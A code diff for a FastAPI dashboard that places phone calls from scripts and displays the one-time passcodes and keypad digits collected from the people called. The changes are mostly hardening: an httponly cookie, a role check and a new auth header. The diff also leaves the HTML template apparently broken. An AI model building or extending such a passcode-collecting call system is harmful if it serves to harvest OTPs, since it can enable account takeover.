@@ -1,4 +1,5 @@
 # ui.py
+# ui.py
 from fastapi import APIRouter, Request, Form
 from fastapi.responses import HTMLResponse, RedirectResponse
 from auth import require_role
@@ -20,7 +21,7 @@ async def login():
 @router.post("/login")
 async def login_post(token: str = Form(...)):
     response = RedirectResponse("/ui", status_code=302)
-    response.set_cookie("session", token)
+    response.set_cookie("session", token, httponly=True)
     return response
 
 # 📊 DASHBOARD
@@ -36,7 +37,12 @@ async def ui(request: Request):
           <td>{sid}</td>
           <td>{data['phone']}</td>
           <td>{data['script']}</td>
-          <td>{data['otp']}</td>
+          <td>
+            <details>
+              <summary>Show</summary>
+              {data['otp']}
+            </details>
+          </td>
           <td>{digits}</td>
           <td>{data['result']}</td>
         </tr>
@@ -64,15 +70,18 @@ async def ui(request: Request):
 
 # 📞 MANUAL CALL TRIGGER
 @router.post("/ui/call")
-async def ui_call(phone: str = Form(...), script: str = Form(...), language: str = Form(...)):
+async def ui_call(
+    request: Request,
+    phone: str = Form(...),
+    script: str = Form(...),
+    language: str = Form(...)
+):
+    require_role(request, "agent")
+
     requests.post(
         f"https://{os.getenv('FLY_APP_NAME')}.fly.dev/fraud/manual-call",
-        headers={"X-Internal-Key": os.getenv("INTERNAL_KEY")},
+        headers={"X-Auth-Token": os.getenv("ADMIN_TOKEN")},
         json={"phone": phone, "script": script, "language": language}
     )
-    return RedirectResponse("/ui", status_code=302)
 
-        </table>
-    </body>
-    </html>
-    """
+    return RedirectResponse("/ui", status_code=302)
